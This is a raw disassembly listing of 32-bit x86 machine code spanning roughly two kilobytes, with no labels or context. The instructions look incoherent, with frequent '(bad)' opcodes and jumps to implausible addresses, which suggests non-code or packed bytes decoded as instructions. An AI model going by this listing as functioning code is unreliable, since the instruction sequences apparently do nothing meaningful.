  407b9b:	xor    bh,BYTE PTR [ebp-0x15fc3e3a]
  407ba1:	xor    DWORD PTR [esi-0x44e60a45],ebx
  407ba7:	addr16 jp 0x407b47
  407baa:	mov    ebp,0x1321c73a
  407baf:	or     al,0xe3
  407bb1:	add    BYTE PTR [eax],al
  407bb3:	ja     0x407bb5
  407bb5:	retf   0x0
  407bb8:	mov    BYTE PTR [edx+0x79df0000],ch
  407bbe:	aaa    
  407bbf:	mul    BYTE PTR [edi+0x75bc36f5]
  407bc5:	ret    0x1948
  407bc8:	add    BYTE PTR [eax],al
  407bca:	cmp    ebx,DWORD PTR [edi+0x47]
  407bcd:	scas   al,BYTE PTR es:[edi]
  407bce:	jbe    0x407b9d
  407bd0:	jne    0x407b6a
  407bd2:	mul    BYTE PTR [edi-0xe]
  407bd5:	push   esp
  407bd6:	mov    esp,0x4f43fde7
  407bdb:	jg     0x407ba0
  407bdd:	add    eax,0xe5f8fbaf
  407be2:	test   eax,0xa5588ac7
  407be7:	mov    dh,0x86
  407be9:	mov    ch,0xb1
  407beb:	jg     0x407bb0
  407bed:	sub    esp,DWORD PTR [ecx-0x5b0f7d85]
  407bf3:	daa    
  407bf4:	(bad)  
  407bf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407bf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407bf7:	jnp    0x407bf1
  407bf9:	mov    ebp,DWORD PTR [eax-0x5fd907e1]
  407bff:	jnp    0x407b83
  407c01:	mov    al,ds:0x8ac2faac
  407c06:	mov    bl,0x1f
  407c08:	jns    0x407bb4
  407c0a:	cmp    BYTE PTR [edi+0x9],bl
  407c0d:	lods   eax,DWORD PTR ds:[esi]
  407c0e:	mov    eax,0xbbe28e1b
  407c13:	daa    
  407c14:	mov    gs,edi
  407c16:	mov    ebx,0xbbca8e1b
  407c1b:	mov    edi,0x87a54af7
  407c20:	daa    
  407c21:	add    al,0x6a
  407c23:	add    BYTE PTR [eax],al
  407c25:	or     DWORD PTR [edi+0x4],edx
  407c28:	jmp    0xca1e:0x93c0000
  407c2f:	jecxz  0x407c19
  407c31:	mov    edi,0xbba28ef7
  407c36:	out    dx,al
  407c37:	shr    DWORD PTR [esi],0x67
  407c3a:	repz je 0x407c10
  407c3d:	mov    ebx,0x40a8b3f8
  407c42:	call   0xa4037c47
  407c47:	out    dx,eax
  407c48:	mov    ebx,0xa7b9b5ee
  407c4d:	icebp  
  407c4e:	(bad)  
  407c4f:	mov    ds:0xa175f83b,eax
  407c54:	fcomip st,st(0)
  407c56:	pop    eax
  407c57:	mov    ds:0xa073f51b,eax
  407c5c:	imul   BYTE PTR [si+0x1baa]
  407c61:	icebp  
  407c62:	adc    eax,0x1af87fae
  407c67:	scas   al,BYTE PTR es:[edi]
  407c68:	sti    
  407c69:	cli    
  407c6a:	mov    eax,ds:0xb8f9a6aa
  407c6f:	push   edi
  407c70:	sti    
  407c71:	jmp    0xf8c02305
  407c76:	hlt    
  407c77:	stos   DWORD PTR es:[edi],eax
  407c78:	jnp    0x407cbb
  407c7a:	adc    al,dl
  407c7c:	daa    
  407c7d:	inc    ecx
  407c7e:	sub    DWORD PTR [ebx+0x1612429f],esp
  407c84:	pop    ds
  407c85:	inc    edx
  407c86:	ja     0x407c2f
  407c88:	pop    ds
  407c89:	icebp  
  407c8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c8b:	aas    
  407c8c:	repz cmp al,0xec
  407c8f:	sub    bh,dl
  407c91:	jnp    0x407cbd
  407c93:	push   ebp
  407c94:	inc    ebx
  407c95:	(bad)  
  407c96:	sub    dl,BYTE PTR [ecx+0x17]
  407c99:	mov    ss,WORD PTR [ecx+edx*2+0x23]
  407c9d:	or     DWORD PTR [edi+0x51],edx
  407ca0:	push   ds
  407ca1:	xchg   BYTE PTR [ebx-0x63],bh
  407ca4:	mov    edi,0x3bf4d2f7
  407ca9:	cld    
  407caa:	mov    bh,0xf4
  407cac:	(bad)  
  407cad:	sti    
  407cae:	adc    ch,dh
  407cb0:	cmp    eax,DWORD PTR [ebp+0x19]
  407cb3:	stos   DWORD PTR es:[edi],eax
  407cb4:	mov    edi,0xbef4f4f7
  407cb9:	hlt    
  407cba:	add    eax,0x38f86782
  407cbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cc0:	mov    ebx,0x1faad7f1
  407cc5:	or     BYTE PTR [ebx-0x5f],0xbb
  407cc9:	hlt    
  407cca:	dec    edi
  407ccb:	mov    ebp,0xa966f9a7
  407cd0:	cmp    edi,ecx
  407cd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407cd3:	lods   eax,DWORD PTR ds:[esi]
  407cd4:	fucomip st,st(5)
  407cd6:	mov    dh,0xa1
  407cd8:	sbb    edi,ecx
  407cda:	jne    0x407c83
  407cdc:	addr16 stc 
  407cde:	cmp    BYTE PTR [ebx+ebx*1+0x7faef9f5],ah
  407ce5:	stc    
  407ce6:	lock scas eax,DWORD PTR es:[edi]
  407ce8:	sti    
  407ce9:	cld    
  407cea:	jmp    0x3935a399
  407cef:	idiv   edx
  407cf1:	cmc    
  407cf2:	pop    ds
  407cf3:	aaa    
  407cf4:	aaa    
  407cf5:	inc    eax
  407cf6:	mov    WORD PTR [eax],es
  407cf8:	add    BYTE PTR [edi],al
  407cfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cfb:	sbb    bh,cl
  407cfd:	shl    DWORD PTR [edx],1
  407cff:	fcomp  QWORD PTR [edi+0x6c]
  407d02:	adc    ebx,DWORD PTR [esi+0x7dc8e4fc]
  407d08:	add    BYTE PTR [eax],al
  407d0a:	jge    0x407ca6
  407d0c:	aad    0x36
  407d0e:	scas   eax,DWORD PTR es:[edi]
  407d0f:	clc    
  407d10:	int3   
  407d11:	sbb    DWORD PTR [eax],eax
  407d13:	add    BYTE PTR [edx],bh
  407d15:	and    al,0x0
  407d17:	popa   
  407d18:	add    BYTE PTR [eax],al
  407d1a:	mov    cl,0x89
  407d1c:	int3   
  407d1d:	pop    ebx
  407d1e:	add    BYTE PTR [eax],al
  407d20:	lock mov bh,0x89
  407d23:	add    eax,0x1b899341
  407d28:	add    ah,dl
  407d2a:	add    BYTE PTR [eax],al
  407d2c:	jmp    0x6dc9ba
  407d31:	add    BYTE PTR [esi-0x13889efa],bh
  407d37:	adc    esi,DWORD PTR [ecx]
  407d39:	pop    es
  407d3a:	add    bl,dl
  407d3c:	add    BYTE PTR [eax],al
  407d3e:	(bad)  
  407d3f:	pusha  
  407d40:	jge    0x407d39
  407d42:	data16 jb 0x407d26
  407d45:	dec    DWORD PTR [eax+0x3]
  407d48:	add    BYTE PTR [eax],al
  407d4a:	popa   
  407d4b:	lods   al,BYTE PTR ds:[esi]
  407d4c:	sti    
  407d4d:	out    dx,eax
  407d4e:	mov    DWORD PTR [esi+0x570ab6bb],edx
  407d54:	ds jg  0x407d87
  407d57:	fadd   DWORD PTR [edi]
  407d59:	stc    
  407d5a:	mov    WORD PTR [eax+0x0],ss
  407d5d:	add    BYTE PTR [ebx+edi*8-0x35],ah
  407d61:	mov    ah,0x31
  407d63:	jmp    0x407d6b
  407d65:	mov    ah,0x97
  407d67:	xchg   ah,bl
  407d69:	jne    0x407d35
  407d6b:	jl     0x407da3
  407d6d:	mov    ah,0x3a
  407d6f:	xchg   ecx,eax
  407d70:	sbb    dh,BYTE PTR [ebx+edi*4]
  407d73:	jmp    0x407dd9
  407d75:	mov    cl,0xcc
  407d77:	ins    BYTE PTR es:[edi],dx
  407d78:	add    BYTE PTR [eax],al
  407d7a:	repnz cmp DWORD PTR [eax+eax*4-0x68ffffda],esi
  407d82:	mov    ds:0xa24cf4,eax
  407d87:	add    BYTE PTR [ecx+ecx*2+0x0],al
  407d8b:	add    BYTE PTR [ebx+0x66ff32bb],al
  407d91:	cmp    BYTE PTR [eax-0x78],cl
  407d94:	add    BYTE PTR [eax],al
  407d96:	add    DWORD PTR [esi],0x18fa5678
  407d9c:	ss dec esi
  407d9e:	es mov ch,0x76
  407da1:	ins    BYTE PTR es:[edi],dx
  407da2:	inc    ecx
  407da3:	sbb    dh,BYTE PTR [ecx+eiz*2]
  407da6:	mov    bl,0xe1
  407da8:	mov    al,0x98
  407daa:	mov    ecx,0x1d8951
  407daf:	xlat   BYTE PTR ds:[ebx]
  407db0:	add    BYTE PTR [eax],al
  407db2:	pop    ebx
  407db3:	dec    DWORD PTR [ebp+0x6f]
  407db6:	mov    esp,0xd9cb3abf
  407dbb:	mov    esi,ecx
  407dbd:	mov    esp,ebp
  407dbf:	push   edi
  407dc0:	pushf  
  407dc1:	add    ecx,0xffffff9e
  407dc4:	xor    ebx,0x9e80a4f6
  407dca:	add    BYTE PTR [eax],al
  407dcc:	and    al,0x43
  407dce:	leave  
  407dcf:	es js  0x407e0a
  407dd2:	jecxz  0x407d9b
  407dd4:	jmp    0xbc18:0x86bfb397
  407ddb:	int3   
  407ddc:	sbb    al,0x0
  407dde:	add    ch,ch
  407de0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407de1:	mov    DWORD PTR ds:0xf45528f9,esi
  407de7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407de8:	adc    ch,cl
  407dea:	ja     0x407d76
  407dec:	dec    ecx
  407ded:	and    esp,eax
  407def:	fadd   QWORD PTR [eax]
  407df1:	add    BYTE PTR [edi],dh
  407df3:	xchg   esp,eax
  407df4:	stos   DWORD PTR es:[edi],eax
  407df5:	xor    DWORD PTR [ebx],eax
  407df7:	xchg   edx,eax
  407df8:	hlt    
  407df9:	rol    edi,0x20
  407dfc:	sub    esi,eax
  407dfe:	mov    al,ds:0x41c6f070
  407e03:	xchg   BYTE PTR [edx+0x63],ch
  407e06:	lea    esi,ds:0x4a16a7c
  407e0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e0d:	add    BYTE PTR [eax],al
  407e0f:	enter  0x76,0x0
  407e13:	mov    cl,BYTE PTR [ebp-0x54]
  407e16:	xchg   esi,eax
  407e17:	mov    ebp,0x48c36cab
  407e1c:	hlt    
  407e1d:	add    BYTE PTR [eax],al
  407e1f:	inc    ecx
  407e20:	lods   al,BYTE PTR ds:[esi]
  407e21:	inc    eax
  407e22:	call   0x817a7e27
  407e27:	fnstenv [ebp-0x30cad9d3]
  407e2d:	lock repz or eax,0xe7997cc3
  407e34:	loopne 0x407df5
  407e36:	and    DWORD PTR [eax],edx
  407e38:	jns    0x407df3
  407e3a:	push   ss
  407e3b:	aad    0xab
  407e3d:	xor    al,0x67
  407e3f:	div    DWORD PTR [edx]
  407e41:	popa   
  407e42:	les    edi,FWORD PTR [edx+0x0]
  407e45:	add    BYTE PTR [eax-0x70],dh
  407e48:	pop    esp
  407e49:	inc    ebp
  407e4a:	add    cl,BYTE PTR [edx]
  407e4c:	xchg   edi,eax
  407e4d:	adc    bh,bh
  407e4f:	add    al,0xe7
  407e51:	add    BYTE PTR [eax],al
  407e53:	ins    BYTE PTR es:[edi],dx
  407e54:	das    
  407e55:	dec    BYTE PTR [eax]
  407e57:	fadd   DWORD PTR [eax]
  407e59:	add    BYTE PTR [eax-0x50fffff6],al
  407e5f:	je     0x407ed7
  407e61:	sbb    BYTE PTR [eax+eax*1+0x279c8d00],0xd
  407e69:	jne    0x407e3f
  407e6b:	out    0xb3,eax
  407e6d:	and    al,0x94
  407e6f:	jne    0x407e8c
  407e71:	jae    0x407e9e
  407e73:	jne    0x407e11
  407e75:	outs   dx,BYTE PTR ds:[esi]
  407e76:	and    ebx,DWORD PTR [edx]
  407e78:	fstp   DWORD PTR [edi+0x4204]
  407e7e:	jge    0x407ea9
  407e80:	ficom  DWORD PTR [ebx+0xf5c0]
  407e86:	(bad)  
  407e87:	fcom   st(1)
  407e89:	mov    ah,0xcc
  407e8b:	jle    0x407e8d
  407e8d:	add    BYTE PTR [edi+0x5c504a57],ch
  407e93:	mov    ecx,0x4b0a0542
  407e98:	sahf   
  407e99:	stos   BYTE PTR es:[edi],al
  407e9a:	retf   0x4d65
  407e9d:	pop    ebp
  407e9e:	xor    edx,eax
  407ea0:	or     edi,DWORD PTR [ebx]
  407ea2:	mov    cl,BYTE PTR [ecx+0x22f36d34]
  407ea8:	mov    ecx,0xfe2d9fa6
  407ead:	aas    
  407eae:	imul   ebp,eax,0xac7cdd35
  407eb4:	aam    0xaa
  407eb6:	ret    
  407eb7:	les    edx,FWORD PTR [ebx]
  407eb9:	add    BYTE PTR [eax],al
  407ebb:	cmp    al,0xe9
  407ebd:	or     edx,DWORD PTR ds:0x3a92034
  407ec3:	pop    ecx
  407ec4:	mov    esi,0xc4c
  407ec9:	push   0xffffffee
  407ecb:	icebp  
  407ecc:	imul   ebx,edi,0xffffffc1
  407ecf:	jae    0x407e70
  407ed1:	outs   dx,DWORD PTR ds:[esi]
  407ed2:	popf   
  407ed3:	dec    ebx
  407ed4:	mov    ds:0x84b4ef86,eax
  407ed9:	sub    al,0x0
  407edb:	add    cl,dh
  407edd:	outs   dx,BYTE PTR ds:[esi]
  407ede:	adc    eax,0x9b1c9ae3
  407ee3:	(bad)  [esi+0x34]
  407ee6:	xchg   ebx,eax
  407ee7:	fiadd  WORD PTR [esi]
  407ee9:	jle    0x407ea0
  407eeb:	fsub   DWORD PTR [edi+0xf]
  407eee:	test   al,0xb3
  407ef0:	add    DWORD PTR [ecx-0x1a024d7b],0xffffffce
  407ef7:	or     BYTE PTR [eax-0x515b0000],bl
  407efd:	hlt    
  407efe:	pop    edx
  407eff:	scas   al,BYTE PTR es:[edi]
  407f00:	(bad)
  407f04:	in     al,dx
  407f05:	jg     0x407eca
  407f07:	mov    bl,0xa7
  407f09:	jg     0x407eeb
  407f0b:	jbe    0x407eba
  407f0d:	push   cs
  407f0e:	push   es
  407f0f:	and    DWORD PTR [ebx+0x0],esp
  407f12:	pop    esp
  407f13:	add    BYTE PTR [eax],al
  407f15:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  407f17:	push   ds
  407f18:	dec    edx
  407f19:	ror    BYTE PTR [ecx-0xec8f2d],cl
  407f1f:	pop    esi
  407f20:	adc    BYTE PTR [ebx+0x7e15117d],0x28
  407f27:	or     bh,dl
  407f29:	add    BYTE PTR [eax],al
  407f2b:	fimul  DWORD PTR [eax-0x21]
  407f2e:	add    BYTE PTR [eax],al
  407f30:	jecxz  0x407f30
  407f32:	add    BYTE PTR [eax+0x0],0x0
  407f36:	push   0x4f80073c
  407f3b:	add    BYTE PTR [eax],al
  407f3d:	or     edx,DWORD PTR [edx+edi*8-0x7b]
  407f41:	leave  
  407f42:	adc    BYTE PTR [edx-0x139f0b6a],ah
  407f48:	push   esp
  407f49:	sub    BYTE PTR [ecx+0x469d0b28],ch
  407f4f:	ret    0x1658
  407f52:	jno    0x407f87
  407f54:	(bad)
  407f57:	outs   dx,BYTE PTR ds:[esi]
  407f58:	inc    ebx
  407f59:	cwde   
  407f5a:	outs   dx,BYTE PTR ds:[esi]
  407f5b:	push   eax
  407f5c:	and    bl,ah
  407f5e:	inc    bh
  407f60:	dec    eax
  407f61:	pop    edi
  407f62:	add    BYTE PTR [eax],al
  407f64:	sbb    DWORD PTR [edx],eax
  407f66:	mov    ss,ecx
  407f68:	jne    0x407f54
  407f6a:	enter  0xf7,0x0
  407f6e:	xor    ah,dl
  407f70:	mov    edi,0xfef13e7d
  407f75:	cli    
  407f76:	cld    
  407f77:	shl    BYTE PTR [edi+0x56],1
  407f7a:	lea    esi,[esi-0x74d61737]
  407f80:	imul   BYTE PTR [ecx+0x139caabe]
  407f86:	scas   al,BYTE PTR es:[edi]
  407f87:	mov    esp,0x5aa5d502
  407f8c:	ins    DWORD PTR es:[edi],dx
  407f8d:	ja     0x407f6a
  407f8f:	add    al,0xad
  407f91:	add    BYTE PTR [eax],al
  407f93:	push   0x6f7037e3
  407f98:	dec    DWORD PTR [edx]
  407f9a:	sbb    DWORD PTR [esi+ecx*2+0x0],eax
  407f9e:	add    BYTE PTR [ecx+0x30d65bb5],dh
  407fa4:	push   esi
  407fa5:	mov    ah,0x9b
  407fa7:	mov    esp,0xe840
  407fac:	dec    ebx
  407fad:	shl    BYTE PTR [ecx+0x33],cl
  407fb0:	sti    
  407fb1:	xor    al,0x9e
  407fb3:	(bad)  
  407fb4:	mov    eax,0x39c8d8
  407fb9:	add    BYTE PTR [eax+0x650c79],dh
  407fbf:	add    BYTE PTR [edi-0x22],dh
  407fc2:	cmp    ch,BYTE PTR [ebp+0x7c]
  407fc5:	call   0xaf1f6f99
  407fca:	test   al,0xff
  407fcc:	xor    al,0x24
  407fce:	repnz dec esp
  407fd0:	scas   eax,DWORD PTR es:[edi]
  407fd1:	add    BYTE PTR [eax],al
  407fd3:	iret   
  407fd4:	push   0xff019c8f
  407fd9:	rol    BYTE PTR [esi+edx*8+0x188b0000],cl
  407fe0:	sbb    DWORD PTR [edi+0x17],esi
  407fe3:	adc    al,0x5a
  407fe5:	pop    ds
  407fe6:	push   ds
  407fe7:	or     eax,0xc94069b0
  407fec:	add    BYTE PTR [eax],al
  407fee:	ja     0x407f90
  407ff0:	push   ebx
  407ff1:	enter  0x74,0x0
  407ff5:	cwde   
  407ff6:	aaa    
  407ff7:	repnz (bad) 
  407ff9:	or     DWORD PTR [eax],ebx
  407ffb:	dec    ebx
  407ffc:	push   edx
  407ffd:	lods   eax,DWORD PTR ds:[esi]
  407ffe:	aaa    
  407fff:	shr    BYTE PTR [edx+0x0],0x0
  408003:	add    dl,BYTE PTR [ebx+0x36]
  408006:	pop    eax
  408007:	rcr    DWORD PTR [eiz*4+0x1a50de8f],cl
  40800e:	jmp    0x40804e
  408010:	jno    0x40803e
  408012:	ins    DWORD PTR es:[edi],dx
  408013:	sbb    BYTE PTR [eax],al
  408015:	lea    eax,[eax]
  408017:	add    bh,ah
  408019:	mov    ecx,eax
  40801b:	inc    BYTE PTR [eax]
  40801d:	add    BYTE PTR [edx+0x6429de3d],ah
  408023:	sub    cl,cl
  408025:	scas   eax,DWORD PTR es:[edi]
  408026:	push   eax
  408027:	mov    bl,ch
  408029:	add    BYTE PTR [eax],al
  40802b:	arpl   WORD PTR [ebx],di
  40802d:	iret   
  40802e:	add    BYTE PTR [esi],0x0
  408031:	add    BYTE PTR [ecx+0x7],bh
  408034:	jle    0x407fe9
  408036:	push   ss
  408037:	bound  esp,QWORD PTR [eax+eiz*4]
  40803a:	adc    ebx,DWORD PTR cs:[edx]
  40803d:	lock xor al,0x0
  408040:	mov    eax,DWORD PTR [eax]
  408042:	add    BYTE PTR [eax+ebp*2],cl
  408045:	add    BYTE PTR [eax],al
  408047:	scas   eax,DWORD PTR es:[edi]
  408048:	cli    
  408049:	xor    edi,ecx
  40804b:	push   eax
  40804c:	mov    ds:0x1e971c75,al
  408051:	and    DWORD PTR [edi-0x6dd2f8cc],esi
  408057:	push   ss
  408058:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408059:	das    
  40805a:	into   
  40805b:	popf   
  40805c:	push   ds
  40805d:	or     BYTE PTR [ebx+0x3c590000],bl
  408063:	stc    
  408064:	cs push ds
  408066:	mov    dh,0xc1
  408068:	and    al,0x2
  40806a:	sbb    bl,ch
  40806c:	adc    DWORD PTR [ebp+0x47ea060b],edx
  408072:	mov    eax,ds:0xddb6d8f5
  408077:	aam    0x1f
  408079:	lds    eax,FWORD PTR [ebp+0x48]
  40807c:	rol    BYTE PTR [eax],0x0
  40807f:	pusha  
  408080:	dec    esp
  408081:	ret    0x0
  408084:	mov    bl,0x88
  408086:	pop    ds
  408087:	add    BYTE PTR [eax],al
  408089:	ds push eax
  40808b:	add    ecx,ecx
  40808d:	and    ebx,esi
  40808f:	mov    eax,0x7ec68364
  408094:	sub    al,0xd7
  408096:	inc    ebx
  408097:	mov    ch,0xd9
  408099:	pushf  
  40809a:	out    0x47,eax
  40809c:	inc    esp
  40809d:	adc    al,BYTE PTR [eax]
  40809f:	add    bl,bh
  4080a1:	fs jg  0x4080ed
  4080a4:	pushf  
  4080a5:	loopne 0x408093
  4080a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080a8:	and    esi,edx
  4080aa:	ret    0x8932
  4080ad:	mov    ah,0xb0
  4080af:	jns    0x40807c
  4080b1:	sbb    BYTE PTR [eax+0x196741b6],ch
  4080b7:	xor    DWORD PTR [ebp-0x572d0371],edx
  4080bd:	sbb    dh,ch
  4080bf:	adc    ecx,ecx
  4080c1:	xchg   esi,eax
  4080c2:	std    
  4080c3:	lds    esp,FWORD PTR [eax-0x56]
  4080c6:	fnstcw WORD PTR [edi-0xfe3844f]
  4080cc:	loopne 0x408104
  4080ce:	sar    ch,0x0
  4080d1:	add    BYTE PTR [ebx+edi*1],cl
  4080d4:	add    BYTE PTR [eax],al
  4080d6:	je     0x408079
  4080d8:	je     0x4080fe
  4080da:	lds    ecx,FWORD PTR [esi-0x7b]
  4080dd:	sub    bh,bh
  4080df:	mov    BYTE PTR [ebp+0x0],cl
  4080e2:	add    BYTE PTR [esi+0x54],ch
  4080e5:	mov    ?,WORD PTR [ecx]
  4080e7:	mov    ebx,0x452a8a34
  4080ec:	dec    edi
  4080ed:	sub    DWORD PTR [esi+edx*8+0x0],eax
  4080f1:	add    BYTE PTR [esi-0x1a07209b],bh
  4080f7:	ror    esp,0xf2
  4080fa:	add    BYTE PTR [eax],al
  4080fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4080fd:	xchg   edx,eax
  4080fe:	out    dx,al
  4080ff:	outs   dx,BYTE PTR ds:[esi]
  408100:	pop    ds
  408101:	mov    dh,0x4a
  408103:	mov    al,0x21
  408105:	popa   
  408106:	aaa    
  408107:	rol    BYTE PTR [esi-0x1f],cl
  40810a:	in     al,0x5d
  40810c:	popa   
  40810d:	dec    BYTE PTR [ebp-0x23c729b1]
  408113:	sbb    eax,0x78708ea6
  408118:	aad    0x4d
  40811a:	out    dx,al
  40811b:	std    
  40811c:	push   ss
  40811d:	add    al,ch
  40811f:	add    BYTE PTR [eax],al
  408121:	(bad)  
  408122:	outs   dx,BYTE PTR ds:[esi]
  408123:	pop    esi
  408124:	call   0x3141:0x4fd72e83
  40812b:	out    0xf4,eax
  40812d:	fadd   QWORD PTR [ebp-0x5]
  408130:	out    0xc0,al
  408132:	inc    BYTE PTR [eax]
  408134:	add    BYTE PTR [ebp-0x1fc34e9e],bh
  40813a:	mov    bl,0x8a
  40813c:	inc    ecx
  40813d:	pop    ss
  40813e:	push   ss
  40813f:	mov    esp,0x4483f66c
  408144:	loopne 0x408146
  408146:	add    BYTE PTR [edx-0x74],dl
  408149:	nop
  40814a:	add    BYTE PTR [eax],al
  40814c:	pop    ss
  40814d:	inc    ebx
  40814e:	fldenv [ebx-0x43a176e1]
  408154:	fmul   QWORD PTR [eax+ecx*8+0x0]
  408158:	add    BYTE PTR [ebx+0x59],dh
  40815b:	push   es
  40815c:	and    al,0x2f
  40815e:	jp     0x4080ff
  408160:	add    dh,BYTE PTR [esi+0x6ff693f1]
  408166:	hlt    
  408167:	push   ecx
  408168:	into   
  408169:	and    BYTE PTR [esi],bl
  40816b:	enter  0x26,0x0
  40816f:	test   ah,0x5c
  408172:	add    BYTE PTR [eax],al
  408174:	test   esi,ecx
  408176:	lods   al,BYTE PTR ds:[esi]
  408177:	xor    BYTE PTR [ebp-0x5f790000],0xec
  40817e:	nop
  40817f:	stos   DWORD PTR es:[edi],eax
  408180:	jno    0x4081ab
  408182:	(bad)  
  408183:	mov    dl,0x6
  408185:	rol    bl,cl
  408187:	jge    0x40812f
  408189:	fisttp DWORD PTR [ebx+0x21]
  40818c:	push   esp
  40818d:	inc    eax
  40818e:	inc    eax
  40818f:	add    BYTE PTR [eax],al
  408191:	lods   eax,DWORD PTR ds:[esi]
  408192:	xchg   esi,eax
  408193:	mov    ds:0xba1b8360,eax
  408198:	pop    ebp
  408199:	addr16 xchg ebp,eax
  40819b:	xchg   esp,eax
  40819c:	shr    edi,0x21
  40819f:	imul   edi,DWORD PTR [ebx+0x4b],0xfffffff5
  4081a3:	dec    edx
  4081a4:	(bad)  
  4081a5:	repz add BYTE PTR [eax],al
  4081a8:	dec    ecx
  4081a9:	mov    ebp,DWORD PTR [eax-0x49ea8a76]
  4081af:	bt     ebx,ebp
  4081b2:	cmp    esi,DWORD PTR ds:0x2bc3dcf0
  4081b8:	call   0xc645:0x9e44
  4081bf:	shr    al,1
  4081c1:	add    bl,dh
  4081c3:	xlat   BYTE PTR ds:[ebx]
  4081c4:	jl     0x40822b
  4081c6:	shl    DWORD PTR [edi],0x93
  4081c9:	xor    edx,DWORD PTR [edi+ecx*8+0x63]
  4081cd:	or     DWORD PTR [ebx],eax
  4081cf:	dec    esi
  4081d0:	inc    ebx
  4081d1:	mov    esi,0x2d82ae03
  4081d6:	pushf  
  4081d7:	idiv   DWORD PTR [edi+0x7a]
  4081da:	outs   dx,DWORD PTR ds:[esi]
  4081db:	dec    eax
  4081dc:	xchg   ecx,eax
  4081dd:	add    BYTE PTR [eax],al
  4081df:	push   cs
  4081e0:	es cli 
  4081e2:	push   ss
  4081e3:	stc    
  4081e4:	cmp    BYTE PTR [eax-0x5f650000],0xa0
  4081eb:	loopne 0x408188
  4081ed:	mov    eax,es:0x82bf634e
  4081f3:	outs   dx,DWORD PTR ds:[esi]
  4081f4:	pusha  
  4081f5:	icebp  
  4081f6:	stc    
  4081f7:	addr16 call 0x5484:0x370f1762
  4081ff:	add    BYTE PTR [eax],al
  408201:	das    
  408202:	int3   
  408203:	data16 add BYTE PTR [eax],al
  408206:	mov    eax,ds:0x6e98b2d8
  40820b:	push   esi
  40820c:	jle    0x4081c2
  40820e:	jns    0x40822a
  408210:	int    0x32
  408212:	pop    es
  408213:	mov    DWORD PTR [ebx],edx
  408215:	or     DWORD PTR [esi-0x2b],ebp
  408218:	ins    BYTE PTR es:[edi],dx
  408219:	in     eax,dx
  40821a:	loop   0x4081b7
  40821c:	(bad)  
  40821d:	dec    edi
  40821e:	add    DWORD PTR [esi+0x24],ebx
  408221:	sub    eax,0x550cd9
  408226:	add    ah,al
  408228:	jne    0x40822a
  40822a:	add    cl,ah
  40822c:	out    0x81,eax
  40822e:	pop    ss
  40822f:	pop    ebx
  408230:	pop    es
  408231:	shl    BYTE PTR [edx-0x2],cl
  408234:	mov    al,ds:0xc948db15
  408239:	add    BYTE PTR [eax],al
  40823b:	outs   dx,DWORD PTR ds:[esi]
  40823c:	mov    edi,0x2f50642a
  408241:	xchg   edx,eax
  408242:	push   ds
  408243:	out    dx,al
  408244:	and    eax,0xf1785979
  408249:	mov    ss,WORD PTR [edx]
  40824b:	sbb    BYTE PTR [edx+0x11972b1e],dh
  408251:	sar    DWORD PTR [edi+0x2d],0x3d
  408255:	xor    BYTE PTR [eax-0x23b6c9db],0x4a
  40825c:	dec    edx
  40825d:	mov    al,fs:0x4a7a53e8
  408263:	retf   
  408264:	sub    DWORD PTR [ecx],0x73
  408267:	(bad)  
  408268:	jl     0x4082c4
  40826a:	das    
  40826b:	mov    BYTE PTR [eax+0x0],bl
  40826e:	add    BYTE PTR [edi+0x5e2e063b],bl
  408274:	in     al,dx
  408275:	popa   
  408276:	xchg   BYTE PTR [ebx],ch
  408278:	inc    edi
  408279:	ins    BYTE PTR es:[edi],dx
  40827a:	mov    ah,0x42
  40827c:	and    DWORD PTR [eax],ebx
  40827e:	jbe    0x408270
  408280:	mov    esi,0xaba422a9
  408285:	and    esp,DWORD PTR [edi-0x64]
  408288:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408289:	jb     0x408297
  40828b:	and    al,BYTE PTR [eax]
  40828d:	add    BYTE PTR [esi+esi*8+0x716e27c6],dl
  408294:	adc    esi,ebp
  408296:	mov    ebp,0xc6dd72a3
  40829b:	das    
  40829c:	daa    
  40829d:	cmp    eax,DWORD PTR [bx+0x19ff]
  4082a2:	lods   al,BYTE PTR ds:[esi]
  4082a3:	jo     0x408245
  4082a5:	dec    esi
  4082a6:	jecxz  0x40830c
  4082a8:	xchg   BYTE PTR ds:0xb413ed27,al
  4082ae:	jecxz  0x40823d
  4082b0:	ret    0x6f93
  4082b3:	cwde   
  4082b4:	and    DWORD PTR [ebp+0x32],eax
  4082b7:	addr16 mov ch,0x8c
  4082ba:	mov    dh,0x0
  4082bc:	add    BYTE PTR [eax+0x20e9476f],dl
  4082c2:	popa   
  4082c3:	inc    esp
  4082c4:	ins    BYTE PTR es:[edi],dx
  4082c5:	add    BYTE PTR [eax],al
  4082c7:	into   
  4082c8:	adc    eax,0x538b9361
  4082cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082ce:	(bad)  
  4082d0:	or     BYTE PTR [ebp+0x22410000],dh
  4082d6:	test   BYTE PTR [eax],dh
  4082d8:	add    BYTE PTR [eax],al
  4082da:	adc    bh,BYTE PTR [esi+0x772d2619]
  4082e0:	sbb    al,0xd9
  4082e2:	int3   
  4082e3:	adc    DWORD PTR [eax],eax
  4082e5:	add    BYTE PTR ds:0xb16739d7,ch
  4082eb:	xchg   edi,eax
  4082ec:	mov    ds:0x953fe129,al
  4082f1:	(bad)  
  4082f2:	and    al,0xea
  4082f4:	pop    eax
  4082f5:	jbe    0x4082de
  4082f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082f8:	pusha  
  4082f9:	out    dx,eax
  4082fa:	mov    BYTE PTR [eax+0x0],al
  4082fd:	add    ch,al
  4082ff:	sbb    al,0x1f
  408301:	and    al,0xa9
  408303:	adc    bh,bh
  408305:	jecxz  0x4082fd
  408307:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
